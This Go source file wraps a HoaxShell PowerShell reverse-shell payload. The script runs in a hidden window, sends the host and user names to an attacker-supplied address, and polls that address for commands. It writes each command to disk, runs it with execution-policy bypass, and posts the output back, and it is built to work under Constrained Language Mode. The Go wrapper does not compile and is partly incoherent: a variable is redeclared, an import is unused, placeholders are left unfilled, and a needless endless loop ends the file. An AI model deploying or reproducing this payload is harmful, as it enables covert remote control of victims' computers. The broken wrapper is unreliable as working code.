package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"strings"
	"time"
)

var info = map[string]string{
	"Title":       "Windows PowerShell outfile HoaxShell - Constraint Language Mode",
	"Author":      "Panagiotis Chartas (t3l3machus)",
	"Description": "An Http based beacon-like reverse shell that writes and executes commands from disc and will work even if Constraint Language Mode is enabled on the victim",
	"References":  "https://github.com/t3l3machus/hoaxshell, https://revshells.com",
}

var meta = map[string]string{
	"handler": "hoaxshell",
	"type":    "ps-outfile-cm",
	"os":      "windows",
	"shell":   "powershell.exe",
}

var config = map[string]float64{
	"frequency": 0.8,
}

var parameters = map[string]interface{}{
	"lhost": nil,
}

var attrs = map[string]interface{}{
	"obfuscate": true,
	"encode":    true,
}

var data = `
Start-Process $env:windir\sysnative\WindowsPowerShell\v1.0\powershell.exe -ArgumentList {
    $ConfirmPreference='None';
    $s='*LHOST*';
    $i='*SESSIONID*';
    $p='http://';
    $v=Invoke-RestMethod -UseBasicParsing -Uri "$p$s/*VERIFY*/$env:COMPUTERNAME/$env:USERNAME" -Headers @{"*HOAXID*"=$i};
    for (;;) {
        $c=(Invoke-RestMethod -UseBasicParsing -Uri "$p$s/*GETCMD*" -Headers @{"*HOAXID*"=$i});
        if (!(@('None','quit') -contains $c)) {
            $c | Out-File -FilePath "*OUTFILE*";
            $r=powershell -ep bypass *OUTFILE* -ErrorAction Stop -ErrorVariable e;
            $r=Out-String -InputObject $r;
            $x=Invoke-RestMethod -Uri "$p$s/*POSTRES*" -Method POST -Headers @{"*HOAXID*"=$i} -Body ($e+$r)
        } elseif ($c -eq 'quit') {
            Remove-Item "*OUTFILE*";
            Stop-Process $PID
        }
        Start-Sleep -Seconds *FREQ*
    }
} -WindowStyle Hidden
`

func main() {
	lhost := parameters["lhost"].(string)
	data := strings.Replace(data, "*LHOST*", lhost, -1)
	data := strings.Replace(data, "*SESSIONID*", "session123", -1) // Replace with actual session ID

	// Define the path for the outfile
	outfilePath := "C:\\Users\\" + os.Getenv("USERNAME") + "\\.local\\haxor.ps1"
	data = strings.Replace(data, "*OUTFILE*", outfilePath, -1)

	// Create the outfile and write the data
	ioutil.WriteFile(outfilePath, []byte(data), 0644)

	cmd := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", data)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Run()

	frequency := config["frequency"]
	for {
		cmd := exec.Command("timeout", "/T", fmt.Sprintf("%.0f", frequency))
		cmd.Run()
	}
}
